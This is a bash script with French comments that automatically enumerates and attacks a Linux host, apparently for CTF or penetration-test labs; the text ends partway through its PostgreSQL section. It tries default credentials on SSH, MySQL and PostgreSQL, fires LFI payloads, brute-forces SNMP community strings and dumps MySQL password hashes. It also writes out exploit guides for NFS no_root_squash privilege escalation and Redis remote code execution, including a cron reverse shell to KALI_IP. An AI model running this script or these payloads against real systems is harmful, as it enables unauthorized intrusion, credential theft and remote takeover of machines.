#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║   Auto-Enum — LINUX MACHINE                                 ║
# ║   Usage: ./enum_linux.sh <TARGET> [USER] [PASS]             ║
# ║   Ex:    ./enum_linux.sh 10.10.10.10                        ║
# ║          ./enum_linux.sh 10.10.10.10 admin password123      ║
# ╚══════════════════════════════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"
USER="${2:-}"
PASS="${3:-}"

require_target "$TARGET"
banner "LINUX FULL ENUM" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "linux")

# Outil nxc/crackmapexec
NXC=$(command -v nxc 2>/dev/null || command -v crackmapexec 2>/dev/null || echo "")

# ─── Wordlist Management ──────────────────────────────────────
# Auto-téléchargement si aucune wordlist disponible
WORDLIST_DIR="$(dirname "$0")/wordlists"
WORDLIST_COMMON="$WORDLIST_DIR/common.txt"

if [[ ! -f "$WORDLIST_COMMON" ]]; then
    mkdir -p "$WORDLIST_DIR"
    info "Wordlist introuvable — téléchargement huntergregal/wordlists..."
    if command -v wget &>/dev/null; then
        wget -q "https://raw.githubusercontent.com/huntergregal/wordlists/master/common.txt" \
            -O "$WORDLIST_COMMON" 2>/dev/null
    else
        curl -s "https://raw.githubusercontent.com/huntergregal/wordlists/master/common.txt" \
            -o "$WORDLIST_COMMON" 2>/dev/null
    fi
    # Fallback sur wordlists système
    if [[ ! -s "$WORDLIST_COMMON" ]]; then
        for _fb in "/usr/share/seclists/Discovery/Web-Content/common.txt" \
                   "/usr/share/wordlists/dirb/common.txt" \
                   "/usr/share/wordlists/common.txt"; do
            [[ -f "$_fb" ]] && cp "$_fb" "$WORDLIST_COMMON" && break
        done
    fi
    [[ -s "$WORDLIST_COMMON" ]] && success "Wordlist OK : $WORDLIST_COMMON ($(wc -l < "$WORDLIST_COMMON") lignes)" \
        || warn "Wordlist introuvable — ffuf désactivé"
fi

# ═══════════════════════════════════════════════════════════════
#  NOTE: chaque section est une FONCTION → `return 0` = early exit
#        quand port fermé, sans interrompre les sections suivantes
# ═══════════════════════════════════════════════════════════════

# ─── 1. FINGERPRINT ────────────────────────────────────────────
do_fingerprint() {
    section "1. FINGERPRINT LINUX"

    # TTL check (indicateur OS) — macOS safe: grep -oE (pas -oP)
    TTL=$(ping -c 1 -W 2 "$TARGET" 2>/dev/null \
        | grep -oE 'ttl=[0-9]+' | head -1 | cut -d= -f2)
    if [[ -n "$TTL" ]]; then
        info "TTL : $TTL"
        [[ "$TTL" -le 70  ]] && info "→ Probablement Linux (TTL ~64)"
        [[ "$TTL" -ge 120 ]] && info "→ Probablement Windows (TTL ~128)"
    fi

    # Nmap OS detection + banners
    info "Nmap — scan OS + banners"
    run "Nmap fingerprint" "$OUTDIR/nmap_fingerprint.txt" \
        nmap -sV -sC -O \
        -p 21,22,25,53,80,111,139,143,443,445,873,2049,3306,5432,6379,8080 \
        --open -oN "$OUTDIR/nmap_fingerprint_raw.txt" "$TARGET"

    # macOS safe: sed au lieu de grep -oP "OS details: \K..."
    OS_INFO=$(grep "OS details:" "$OUTDIR/nmap_fingerprint_raw.txt" 2>/dev/null \
        | sed 's/.*OS details: //' | head -1)
    [[ -n "$OS_INFO" ]] && finding "OS : $OS_INFO"

    # macOS safe: grep -oE + sed au lieu de grep -oP "cpe:/o:\K..."
    DISTRO=$(grep "OS CPE:" "$OUTDIR/nmap_fingerprint_raw.txt" 2>/dev/null \
        | grep -oE 'cpe:/o:[^ ]+' | sed 's|cpe:/o:||' | head -1)
    [[ -n "$DISTRO" ]] && info "Distro CPE : $DISTRO"
}

# ─── 2. SSH (22) ───────────────────────────────────────────────
do_ssh() {
    section "2. SSH (22)"

    # Bug fix: vérifier la réponse du port AVANT toute action
    SSH_BANNER=$(timeout 5 nc -w 3 "$TARGET" 22 2>/dev/null | head -1)
    if [[ -z "$SSH_BANNER" ]]; then
        info "Port 22 fermé ou pas de réponse — section SSH ignorée"
        return 0
    fi

    info "SSH Banner : $SSH_BANNER"
    # macOS safe: grep -oE + sed au lieu de grep -oP "OpenSSH_\K..."
    SSH_VER=$(echo "$SSH_BANNER" | grep -oE "OpenSSH_[0-9.p]+" | sed 's/OpenSSH_//')
    [[ -n "$SSH_VER" ]] && finding "OpenSSH version : $SSH_VER"
    echo "$SSH_BANNER" > "$OUTDIR/ssh_banner.txt"

    # Auth methods disponibles
    info "SSH — méthodes d'authentification"
    ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=none \
        -o BatchMode=yes "$TARGET" 2>&1 \
        | grep -iE "publickey|password|keyboard|auth" \
        | tee "$OUTDIR/ssh_auth_methods.txt"

    # Nmap SSH scripts
    run "Nmap SSH" "$OUTDIR/nmap_ssh.txt" \
        nmap -p22 --script ssh-auth-methods,ssh-hostkey,sshv1 "$TARGET"

    # Weak ciphers (ssh-audit)
    if command -v ssh-audit &>/dev/null; then
        info "ssh-audit — check ciphers faibles"
        timeout 20 ssh-audit "$TARGET" 2>&1 \
            | grep -iE "warn|fail|crit" | tee "$OUTDIR/ssh_audit.txt"
    else
        warn "Outil manquant : ssh-audit — section ignorée"
    fi

    # Default creds
    # Bug fix: utiliser un MARQUEUR POSITIF ("ENUM_SSH_OK_") au lieu de grep -qvE
    # L'ancienne méthode retournait vrai pour n'importe quelle réponse sans les mots-clés
    # (incluant les réponses vides ou erreurs atypiques)
    if command -v sshpass &>/dev/null; then
        DEFAULT_SSH_CREDS=("root:root" "root:toor" "admin:admin" "pi:raspberry"
                           "ubuntu:ubuntu" "kali:kali" "vagrant:vagrant")
        for CRED in "${DEFAULT_SSH_CREDS[@]}"; do
            _u="${CRED%%:*}"; _p="${CRED##*:}"
            RESULT=$(timeout 5 sshpass -p "$_p" \
                ssh -o StrictHostKeyChecking=no \
                    -o ConnectTimeout=3 \
                    -o BatchMode=no \
                "$_u@$TARGET" "echo ENUM_SSH_OK_\$(whoami)" 2>&1)
            if echo "$RESULT" | grep -q "^ENUM_SSH_OK_"; then
                success "SSH DEFAULT CREDS : $_u:$_p"
                echo "SSH:$_u:$_p" >> "$OUTDIR/valid_creds.txt"
                finding "SSH_DEFAULT_CREDS:$_u:$_p"
                echo "SSH_DEFAULT_CREDS:$_u:$_p" >> "$OUTDIR/findings.txt"
                break
            fi
        done
    else
        warn "sshpass manquant — test creds SSH par défaut ignoré"
    fi

    # Avec creds fournis
    if [[ -n "$USER" && -n "$PASS" ]] && command -v sshpass &>/dev/null; then
        info "Test SSH avec creds fournis : $USER"
        RESULT=$(timeout 5 sshpass -p "$PASS" \
            ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
            "$USER@$TARGET" "echo ENUM_SSH_OK_\$(whoami)" 2>&1)
        echo "$RESULT" | tee "$OUTDIR/ssh_auth_test.txt"
        if echo "$RESULT" | grep -q "^ENUM_SSH_OK_"; then
            success "SSH AUTH OK : $USER@$TARGET"
            echo "SSH:$USER:$PASS" >> "$OUTDIR/valid_creds.txt"
        fi
    fi
}

# ─── 3. FTP (21) ───────────────────────────────────────────────
do_ftp() {
    section "3. FTP (21)"

    # Bug fix: `nc || { info "fermé"; }` ne stoppait pas la section
    # → on utilise `return 0` dans une fonction pour early exit propre
    if ! nc -w 2 "$TARGET" 21 </dev/null 2>/dev/null; then
        info "Port 21 fermé — section FTP ignorée"
        # vsftpd backdoor check via nmap même si port "fermé" (peut être filtré)
        nmap -p21 --script ftp-vsftpd-backdoor "$TARGET" 2>/dev/null \
            | tee "$OUTDIR/nmap_ftp.txt" \
            | grep -qi "backdoor\|VULNERABLE" \
            && echo "FTP_VSFTPD_BACKDOOR" >> "$OUTDIR/findings.txt"
        return 0
    fi

    # Banner
    FTP_BANNER=$(timeout 5 nc -w 3 "$TARGET" 21 2>/dev/null | head -1)
    [[ -n "$FTP_BANNER" ]] && {
        info "FTP Banner : $FTP_BANNER"
        echo "$FTP_BANNER" > "$OUTDIR/ftp_banner.txt"
    }

    # Anonymous login
    info "Test FTP anonyme"
    FTP_ANON=$(timeout 10 ftp -n "$TARGET" <<'FTPCMDS' 2>&1
user anonymous anonymous
pwd
ls
quit
FTPCMDS
)
    echo "$FTP_ANON" | tee "$OUTDIR/ftp_anon.txt"

    if echo "$FTP_ANON" | grep -qE "230|Login successful"; then
        success "FTP ANONYME AUTORISÉ !"
        echo "FTP_ANONYMOUS" >> "$OUTDIR/findings.txt"
        echo "FTP:anonymous:anonymous" >> "$OUTDIR/valid_creds.txt"

        # Télécharger tous les fichiers
        info "Téléchargement récursif des fichiers FTP"
        mkdir -p "$OUTDIR/ftp_files"
        timeout 30 wget -r -np -nH --no-verbose \
            "ftp://anonymous:anonymous@$TARGET/" \
            -P "$OUTDIR/ftp_files/" 2>&1 | tee "$OUTDIR/ftp_download.txt"

        # Test upload anonyme
        echo "test_upload_$(date +%s)" > /tmp/ftp_test_upload.txt
        FTP_UPLOAD=$(timeout 5 ftp -n "$TARGET" <<'FTPCMDS' 2>&1
user anonymous anonymous
put /tmp/ftp_test_upload.txt
quit
FTPCMDS
)
        echo "$FTP_UPLOAD" | grep -qiE "226|Transfer complete|success" && {
            warning "FTP UPLOAD POSSIBLE en anonyme !"
            echo "FTP_UPLOAD_ANON" >> "$OUTDIR/findings.txt"
        }
        rm -f /tmp/ftp_test_upload.txt
    fi

    # Test avec creds fournis
    if [[ -n "$USER" && -n "$PASS" ]]; then
        info "FTP — test avec creds : $USER"
        timeout 10 ftp -n "$TARGET" <<EOF 2>&1 | tee "$OUTDIR/ftp_auth.txt"
user $USER $PASS
pwd
ls -la
quit
EOF
    fi

    # Nmap FTP scripts complets
    nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor \
        "$TARGET" 2>/dev/null | tee "$OUTDIR/nmap_ftp.txt"
    grep -qiE "VULNERABLE|backdoor|Anonymous ftp login allowed" \
        "$OUTDIR/nmap_ftp.txt" 2>/dev/null \
        && echo "FTP_VULN_OR_ANON" >> "$OUTDIR/findings.txt"
}

# ─── 4. WEB (80/443/8080...) ───────────────────────────────────
do_web() {
    section "4. WEB"

    # Détecter tous les ports HTTP — macOS safe: grep -oE + grep -oE
    # (pas de lookahead → on matche le pattern complet puis on extrait le port)
    HTTP_PORTS=$(nmap -p 80,443,8000,8080,8443,8888,9090,9200 \
        --open -T4 "$TARGET" 2>/dev/null \
        | grep -oE '[0-9]+/tcp[[:space:]]+open[[:space:]]+https?' \
        | grep -oE '^[0-9]+' \
        | tr '\n' ' ')
    [[ -z "$HTTP_PORTS" ]] && HTTP_PORTS="80"

    for PORT_WEB in $HTTP_PORTS; do
        nc -w 2 "$TARGET" "$PORT_WEB" </dev/null 2>/dev/null || continue
        PROTO="http"
        [[ "$PORT_WEB" == "443" || "$PORT_WEB" == "8443" ]] && PROTO="https"
        WEB_DIR="$OUTDIR/web_$PORT_WEB"
        mkdir -p "$WEB_DIR"

        info "Web enum ${PROTO}://$TARGET:$PORT_WEB"

        # ── Headers + banner ──────────────────────────────
        curl -sIL --max-time 10 "${PROTO}://${TARGET}:${PORT_WEB}" 2>/dev/null \
            | tee "$WEB_DIR/headers.txt"

        # robots.txt
        curl -s --max-time 8 \
            "${PROTO}://${TARGET}:${PORT_WEB}/robots.txt" 2>/dev/null \
            | grep -v "^#\|^$" | tee "$WEB_DIR/robots.txt"

        # ── httpx (ProjectDiscovery) — fingerprint tech stack ──
        if command -v httpx &>/dev/null; then
            info "httpx — fingerprint tech stack"
            echo "${PROTO}://${TARGET}:${PORT_WEB}" \
                | httpx -title -tech-detect -status-code \
                    -web-server -follow-redirects -silent 2>/dev/null \
                | tee "$WEB_DIR/httpx.txt"
        fi

        # ── whatweb ──────────────────────────────────────
        if command -v whatweb &>/dev/null; then
            info "whatweb — fingerprint CMS/stack"
            timeout 20 whatweb -a 3 \
                "${PROTO}://${TARGET}:${PORT_WEB}" 2>&1 \
                | tee "$WEB_DIR/whatweb.txt"
        fi

        # ── SSL cert SANs (sous-domaines) ─────────────────
        if [[ "$PROTO" == "https" ]]; then
            openssl s_client -connect "${TARGET}:${PORT_WEB}" \
                2>/dev/null </dev/null \
                | openssl x509 -noout -text 2>/dev/null \
                | grep -A 5 "Subject Alternative" \
                | tee "$WEB_DIR/ssl_san.txt"
            # macOS safe: grep -oE + sed au lieu de grep -oP "DNS:\K..."
            grep -oE "DNS:[^,]+" "$WEB_DIR/ssl_san.txt" 2>/dev/null \
                | sed 's/DNS://' | tee "$WEB_DIR/subdomains_ssl.txt"
        fi

        # ── LFI test rapide ───────────────────────────────
        info "LFI test rapide"
        for LFI_PATH in "../../../etc/passwd" \
                        "....//....//....//etc/passwd" \
                        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"; do
            LFI_RESULT=$(curl -s --max-time 8 \
                "${PROTO}://${TARGET}:${PORT_WEB}/?file=${LFI_PATH}" 2>/dev/null)
            if echo "$LFI_RESULT" | grep -q "root:x:0:0"; then
                success "LFI TROUVÉ : /?file=$LFI_PATH"
                echo "$LFI_RESULT" | tee "$WEB_DIR/lfi_exploit.txt"
                echo "LFI:$PORT_WEB:file=$LFI_PATH" >> "$OUTDIR/findings.txt"
                break
            fi
        done

        # ── nikto ────────────────────────────────────────
        if command -v nikto &>/dev/null; then
            info "nikto — scan web classique"
            timeout 90 nikto -h "${PROTO}://${TARGET}:${PORT_WEB}" \
                -output "$WEB_DIR/nikto.txt" 2>&1 | tail -5
        fi

        # ── ffuf — utilise notre wordlist auto-téléchargée ──
        if command -v ffuf &>/dev/null && [[ -f "$WORDLIST_COMMON" ]]; then
            info "ffuf — directory fuzzing + extensions Linux"
            run_long "ffuf $PORT_WEB" "$WEB_DIR/ffuf.txt" 120 \
                ffuf -u "${PROTO}://${TARGET}:${PORT_WEB}/FUZZ" \
                -w "$WORDLIST_COMMON" \
                -e ".php,.txt,.bak,.old,.zip,.tar.gz,.sql,.html,.sh,.py,.conf,.xml" \
                -mc 200,201,301,302,403 -t 50 -s 2>&1
        elif command -v gobuster &>/dev/null && [[ -f "$WORDLIST_COMMON" ]]; then
            run_long "gobuster $PORT_WEB" "$WEB_DIR/gobuster.txt" 90 \
                gobuster dir -u "${PROTO}://${TARGET}:${PORT_WEB}" \
                -w "$WORDLIST_COMMON" \
                -x php,txt,bak,old,zip,html,sh,py,conf,xml \
                --no-error -q
        fi

        # ── nuclei (ProjectDiscovery) — CVEs + misconfigs ──
        if command -v nuclei &>/dev/null; then
            info "nuclei — CVEs / misconfigs / default-logins"
            run_long "nuclei $PORT_WEB" "$WEB_DIR/nuclei.txt" 180 \
                nuclei -u "${PROTO}://${TARGET}:${PORT_WEB}" \
                -tags cves,exposed-panels,misconfigs,default-logins,technologies \
                -severity medium,high,critical \
                -silent 2>&1
            # Extraire les findings critiques
            if [[ -s "$WEB_DIR/nuclei.txt" ]]; then
                grep -iE "\[critical\]|\[high\]" "$WEB_DIR/nuclei.txt" 2>/dev/null \
                | while IFS= read -r _line; do
                    finding "NUCLEI: $_line"
                    echo "NUCLEI:$PORT_WEB:$_line" >> "$OUTDIR/findings.txt"
                done
            fi
        fi

        # ── katana (ProjectDiscovery) — crawl URLs ─────────
        if command -v katana &>/dev/null; then
            info "katana — crawl URLs (depth 3)"
            run_long "katana $PORT_WEB" "$WEB_DIR/katana.txt" 60 \
                katana -u "${PROTO}://${TARGET}:${PORT_WEB}" \
                -d 3 -silent 2>&1
        fi

        # ── CMS detection ─────────────────────────────────
        CMS=""
        for _f in "$WEB_DIR/whatweb.txt" "$WEB_DIR/headers.txt" \
                  "$WEB_DIR/httpx.txt" "$WEB_DIR/ffuf.txt"; do
            [[ -f "$_f" ]] || continue
            grep -qi "wordpress\|wp-content\|wp-login" "$_f" 2>/dev/null \
                && { CMS="WordPress"; break; }
            grep -qi "drupal" "$_f" 2>/dev/null \
                && { CMS="Drupal"; break; }
            grep -qi "joomla" "$_f" 2>/dev/null \
                && { CMS="Joomla"; break; }
        done

        [[ -n "$CMS" ]] && {
            finding "CMS détecté : $CMS sur port $PORT_WEB"
            echo "CMS:$CMS:$PORT_WEB" >> "$OUTDIR/findings.txt"
            if [[ "$CMS" == "WordPress" ]] && command -v wpscan &>/dev/null; then
                info "wpscan — WordPress scan complet"
                run_long "wpscan $PORT_WEB" "$WEB_DIR/wpscan.txt" 120 \
                    wpscan --url "${PROTO}://${TARGET}:${PORT_WEB}" \
                    --enumerate ap,u --no-banner 2>&1
            fi
        }
    done
}

# ─── 5. SMB / SAMBA (445) ──────────────────────────────────────
do_smb() {
    section "5. SMB / SAMBA (445)"

    # EternalBlue check via nmap — TOUJOURS lancer (pas via nxc pour éviter faux positifs)
    nmap -p445 --script smb-vuln-ms17-010 "$TARGET" 2>/dev/null \
        | tee "$OUTDIR/smb_vuln.txt" \
        | grep -qi "VULNERABLE" \
        && echo "MS17-010_ETERNALBLUE" >> "$OUTDIR/findings.txt"

    # Bug fix: early return si port fermé
    if ! nc -w 2 "$TARGET" 445 </dev/null 2>/dev/null; then
        info "Port 445 fermé — section SMB ignorée (vuln check effectué)"
        return 0
    fi

    # Fingerprint
    [[ -n "$NXC" ]] && $NXC smb "$TARGET" 2>&1 | tee "$OUTDIR/smb_fingerprint.txt"

    # Null/guest session
    info "SMB — null/guest session"
    smbclient -L "//$TARGET" -N 2>&1 | tee "$OUTDIR/smb_null.txt"

    if [[ -n "$NXC" ]]; then
        $NXC smb "$TARGET" -u '' -p '' --shares 2>&1 | tee "$OUTDIR/smb_null_nxc.txt"
        $NXC smb "$TARGET" -u 'guest' -p '' --shares 2>&1 | tee "$OUTDIR/smb_guest_nxc.txt"
    fi

    # smbmap
    if command -v smbmap &>/dev/null; then
        smbmap -H "$TARGET" 2>&1 | tee "$OUTDIR/smbmap.txt"
        [[ -n "$USER" ]] && smbmap -H "$TARGET" -u "$USER" -p "$PASS" 2>&1 \
            | tee "$OUTDIR/smbmap_auth.txt"
    fi

    # Avec creds fournis
    [[ -n "$USER" && -n "$NXC" ]] && \
        $NXC smb "$TARGET" -u "$USER" -p "$PASS" --shares 2>&1 \
        | tee "$OUTDIR/smb_auth.txt"
}

# ─── 6. NFS (2049) ─────────────────────────────────────────────
do_nfs() {
    section "6. NFS (2049)"

    # Bug fix: vérifier port 111 OU 2049, early return si aucun
    if ! nc -w 2 "$TARGET" 111 </dev/null 2>/dev/null && \
       ! nc -w 2 "$TARGET" 2049 </dev/null 2>/dev/null; then
        info "Ports 111/2049 fermés — section NFS ignorée"
        return 0
    fi

    info "showmount — exports NFS"
    showmount -e "$TARGET" 2>&1 | tee "$OUTDIR/nfs_exports.txt"

    if grep -v "^Export\|^Exports\|^#" "$OUTDIR/nfs_exports.txt" 2>/dev/null \
        | grep -q "/"; then
        finding "EXPORTS NFS TROUVÉS !"
        echo "NFS_EXPORTS" >> "$OUTDIR/findings.txt"

        while read -r EXPORT _rest; do
            [[ -z "$EXPORT" || "$EXPORT" == "Export" ]] && continue
            MOUNTPOINT="/mnt/nfs_$(echo "$EXPORT" | tr '/' '_')_$$"
            info "Montage de $TARGET:$EXPORT"
            sudo mkdir -p "$MOUNTPOINT" 2>/dev/null

            if sudo mount -t nfs "$TARGET:$EXPORT" "$MOUNTPOINT" \
                    -o vers=3,nolock 2>/dev/null \
               || sudo mount -t nfs "$TARGET:$EXPORT" "$MOUNTPOINT" \
                    -o vers=4,nolock 2>/dev/null; then
                success "Monté : $MOUNTPOINT"
                ls -la "$MOUNTPOINT" 2>/dev/null \
                    | tee "$OUTDIR/nfs_$(basename "$EXPORT").txt"

                # Fichiers sensibles
                find "$MOUNTPOINT" -type f \
                    \( -name "*.txt" -o -name "*.conf" -o -name "*.key" \
                       -o -name "authorized_keys" -o -name "id_rsa" \
                       -o -name "*.bak" \) 2>/dev/null \
                    | head -20 | tee -a "$OUTDIR/nfs_interesting.txt"

                # Détecter no_root_squash
                OWNER=$(ls -lan "$MOUNTPOINT" 2>/dev/null | awk 'NR==2{print $3}')
                [[ "$OWNER" == "0" ]] && {
                    success "no_root_squash PROBABLE (owned by uid 0) !"
                    finding "NFS_NO_ROOT_SQUASH:$EXPORT"
                    echo "NFS_NO_ROOT_SQUASH:$EXPORT" >> "$OUTDIR/findings.txt"
                    cat >> "$OUTDIR/nfs_exploit_guide.txt" << EOF
# EXPLOIT no_root_squash sur $EXPORT
# Depuis Kali (en root) :
sudo cp /bin/bash $MOUNTPOINT/bash
sudo chmod u+s $MOUNTPOINT/bash
# Sur la cible :
./bash -p   # → uid=0(root)

# OU : SSH key injection
sudo cp ~/.ssh/id_rsa.pub $MOUNTPOINT/root/.ssh/authorized_keys 2>/dev/null
ssh root@$TARGET
EOF
                }
                sudo umount "$MOUNTPOINT" 2>/dev/null
                sudo rmdir "$MOUNTPOINT" 2>/dev/null
            else
                warn "Impossible de monter $EXPORT"
            fi
        done < <(grep "^/" "$OUTDIR/nfs_exports.txt" 2>/dev/null)
    fi
}

# ─── 7. SMTP (25/587) ──────────────────────────────────────────
do_smtp() {
    section "7. SMTP (25/587)"

    for SMTP_PORT in 25 587; do
        nc -w 3 "$TARGET" "$SMTP_PORT" </dev/null 2>/dev/null || continue
        info "SMTP enum sur port $SMTP_PORT"

        SMTP_BANNER=$(timeout 5 nc -w 3 "$TARGET" "$SMTP_PORT" 2>/dev/null | head -1)
        [[ -n "$SMTP_BANNER" ]] && info "SMTP Banner : $SMTP_BANNER"

        # EHLO capabilities
        echo -e "EHLO test\nQUIT" \
            | timeout 5 nc "$TARGET" "$SMTP_PORT" 2>/dev/null \
            | tee "$OUTDIR/smtp_ehlo_$SMTP_PORT.txt"

        # User enum
        if command -v smtp-user-enum &>/dev/null; then
            ULIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
            [[ -f "$ULIST" ]] && run_long "smtp-user-enum $SMTP_PORT" \
                "$OUTDIR/smtp_users_$SMTP_PORT.txt" 60 \
                smtp-user-enum -M VRFY -U "$ULIST" -t "$TARGET" -p "$SMTP_PORT"
        else
            nmap -p"$SMTP_PORT" --script smtp-enum-users,smtp-open-relay \
                --script-args "smtp-enum-users.methods=VRFY,RCPT,EXPN" \
                "$TARGET" 2>/dev/null | tee "$OUTDIR/nmap_smtp_$SMTP_PORT.txt"
        fi

        # Open relay test
        RELAY_TEST=$(echo -e "EHLO test\nMAIL FROM:<test@test.com>\nRCPT TO:<test@google.com>\nQUIT" \
            | timeout 5 nc "$TARGET" "$SMTP_PORT" 2>/dev/null)
        echo "$RELAY_TEST" | grep -q "250" && {
            warning "OPEN RELAY possible sur port $SMTP_PORT !"
            echo "SMTP_OPEN_RELAY:$SMTP_PORT" >> "$OUTDIR/findings.txt"
        }
    done
}

# ─── 8. SNMP (161 UDP) ─────────────────────────────────────────
do_snmp() {
    section "8. SNMP (161 UDP)"

    # Vérifier si UDP 161 est réellement OPEN (pas open|filtered)
    SNMP_OPEN=$(timeout 5 sudo nmap -sU -p161 --open "$TARGET" 2>/dev/null \
        | grep "161/udp.*open ")
    [[ -z "$SNMP_OPEN" ]] && info "SNMP port 161 UDP non confirmé (open|filtered ignoré)"

    # Community string bruteforce
    if command -v onesixtyone &>/dev/null; then
        info "onesixtyone — community string bruteforce"
        COMMUNITY_LIST="/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"
        [[ ! -f "$COMMUNITY_LIST" ]] && \
            COMMUNITY_LIST="/usr/share/seclists/Discovery/SNMP/snmp.txt"
        [[ -f "$COMMUNITY_LIST" ]] && \
            onesixtyone -c "$COMMUNITY_LIST" "$TARGET" 2>&1 \
            | tee "$OUTDIR/snmp_community.txt"
    else
        warn "Outil manquant : onesixtyone — section ignorée"
    fi

    # Test manuel des community strings courantes
    COMMUNITY_FOUND=""
    for COMM in "public" "private" "community" "manager" "admin" "snmpd" "cisco" "default"; do
        RESULT=$(timeout 3 snmpget -v2c -c "$COMM" "$TARGET" sysDescr.0 2>/dev/null)
        if [[ -n "$RESULT" ]] && ! echo "$RESULT" | grep -q "Timeout\|Error"; then
            success "Community string valide : $COMM"
            COMMUNITY_FOUND="$COMM"
            echo "$COMM" >> "$OUTDIR/snmp_valid_communities.txt"
            echo "SNMP_COMMUNITY:$COMM" >> "$OUTDIR/findings.txt"
            break
        fi
    done

    # Fallback : parser le résultat de onesixtyone
    if [[ -z "$COMMUNITY_FOUND" ]] && [[ -s "$OUTDIR/snmp_community.txt" ]]; then
        COMMUNITY_FOUND=$(grep -v "^Scanning\|^$" "$OUTDIR/snmp_community.txt" \
            | awk '{print $NF}' | head -1 | tr -d '[]')
    fi

    if [[ -n "$COMMUNITY_FOUND" ]]; then
        info "snmpwalk — dump avec community '$COMMUNITY_FOUND'"
        snmpwalk -v2c -c "$COMMUNITY_FOUND" "$TARGET" 2>/dev/null \
            | tee "$OUTDIR/snmp_walk.txt" | head -50
        snmpwalk -v2c -c "$COMMUNITY_FOUND" "$TARGET" \
            1.3.6.1.2.1.25.4.2.1.2 2>/dev/null \
            | tee "$OUTDIR/snmp_processes.txt"
        snmpwalk -v2c -c "$COMMUNITY_FOUND" "$TARGET" \
            1.3.6.1.2.1.25.6.3.1.2 2>/dev/null \
            | tee "$OUTDIR/snmp_installed.txt"
        snmpwalk -v2c -c "$COMMUNITY_FOUND" "$TARGET" \
            1.3.6.1.2.1.1.5.0 2>/dev/null \
            | tee "$OUTDIR/snmp_hostname.txt"

        grep -iE "password|pass=|pwd=|token|secret|apikey" \
            "$OUTDIR/snmp_processes.txt" 2>/dev/null \
            && finding "CREDS POSSIBLE DANS PROCESSUS SNMP !"
    fi
}

# ─── 9. REDIS (6379) ───────────────────────────────────────────
do_redis() {
    section "9. REDIS (6379)"

    # Bug fix: early return si port fermé
    if ! nc -w 2 "$TARGET" 6379 </dev/null 2>/dev/null; then
        info "Port 6379 fermé — Redis ignoré"
        return 0
    fi

    info "Redis — test accès non authentifié"
    REDIS_INFO=$(echo -e "PING\r\nINFO server\r\nQUIT\r\n" \
        | timeout 5 nc -w 3 "$TARGET" 6379 2>/dev/null)
    echo "$REDIS_INFO" | tee "$OUTDIR/redis_info.txt"

    if echo "$REDIS_INFO" | grep -qiE "PONG|redis_version"; then
        success "REDIS ACCESSIBLE SANS AUTH !"
        echo "REDIS_NOAUTH" >> "$OUTDIR/findings.txt"
        echo "REDIS:noauth" >> "$OUTDIR/valid_creds.txt"

        # macOS safe: grep -oE + cut au lieu de grep -oP "redis_version:\K..."
        REDIS_VER=$(echo "$REDIS_INFO" \
            | grep "redis_version:" \
            | grep -oE "redis_version:[^ ]+" \
            | cut -d: -f2)
        [[ -n "$REDIS_VER" ]] && finding "Redis version : $REDIS_VER"

        # Enum keys
        REDIS_KEYS=$(echo -e "KEYS *\r\nQUIT\r\n" \
            | timeout 5 nc -w 3 "$TARGET" 6379 2>/dev/null)
        echo "$REDIS_KEYS" | tee "$OUTDIR/redis_keys.txt"

        # Guide RCE
        cat >> "$OUTDIR/redis_rce_guide.txt" << 'REDIS_EOF'
# Redis RCE via SSH authorized_keys (Redis en root)
redis-cli -h TARGET flushall
redis-cli -h TARGET config set dir /root/.ssh/
redis-cli -h TARGET config set dbfilename authorized_keys
printf "\n\n" > /tmp/key.txt
cat ~/.ssh/id_rsa.pub >> /tmp/key.txt
printf "\n\n" >> /tmp/key.txt
redis-cli -h TARGET -x set authkey < /tmp/key.txt
redis-cli -h TARGET save
ssh -i ~/.ssh/id_rsa root@TARGET

# Redis RCE via cron
redis-cli -h TARGET config set dir /var/spool/cron/
redis-cli -h TARGET config set dbfilename root
redis-cli -h TARGET set cron "\n\n*/1 * * * * bash -i >& /dev/tcp/KALI_IP/4444 0>&1\n\n"
redis-cli -h TARGET save
REDIS_EOF
    fi
}

# ─── 10. MYSQL (3306) ──────────────────────────────────────────
do_mysql() {
    section "10. MYSQL (3306)"

    # Bug fix: early return si port fermé
    if ! nc -w 2 "$TARGET" 3306 </dev/null 2>/dev/null; then
        info "Port 3306 fermé — MySQL ignoré"
        return 0
    fi

    MYSQL_BANNER=$(timeout 5 nc -w 3 "$TARGET" 3306 2>/dev/null | strings | head -1)
    [[ -n "$MYSQL_BANNER" ]] && {
        info "MySQL Banner : $MYSQL_BANNER"
        echo "$MYSQL_BANNER" > "$OUTDIR/mysql_banner.txt"
    }

    if command -v mysql &>/dev/null; then
        for CRED in "root:" "root:root" "root:mysql" "root:toor" \
                    "root:password" "root:Password1" "admin:admin"; do
            _u="${CRED%%:*}"; _p="${CRED##*:}"
            RESULT=$(timeout 5 mysql -h "$TARGET" -u "$_u" ${_p:+-p$_p} \
                -e "SHOW DATABASES;" 2>&1)
            if echo "$RESULT" | grep -qE "Database|information_schema"; then
                success "MySQL DEFAULT CREDS : $_u:${_p:-<empty>}"
                echo "$RESULT" | tee "$OUTDIR/mysql_databases.txt"
                echo "MYSQL:$_u:${_p}" >> "$OUTDIR/valid_creds.txt"
                echo "MYSQL_ACCESS:$_u" >> "$OUTDIR/findings.txt"
                mysql -h "$TARGET" -u "$_u" ${_p:+-p$_p} \
                    -e "SELECT user,password,plugin FROM mysql.user;" 2>/dev/null \
                    | tee "$OUTDIR/mysql_users.txt"
                break
            fi
        done
    fi
}

# ─── 11. POSTGRESQL (5432) ─────────────────────────────────────
do_postgresql() {
    section "11. POSTGRESQL (5432)"

    # Bug fix: early return si port fermé
    if ! nc -w 2 "$TARGET" 5432 </dev/null 2>/dev/null; then
        info "Port 5432 fermé — PostgreSQL ignoré"
        return 0
    fi

    if command -v psql &>/dev/null; then
        for CRED in "postgres:postgres" "postgres:" "postgres:password" "admin:admin"; do
            _u="${CRED%%:*}"; _p="${CRED##*:}"
            RESULT=$(timeout 5 PGPASSWORD="$_p" \
                psql -h "$TARGET" -U "$_u" -c "\l" 2>&1)
            if echo "$RESULT" | grep -qE "List of databases|postgres"; then
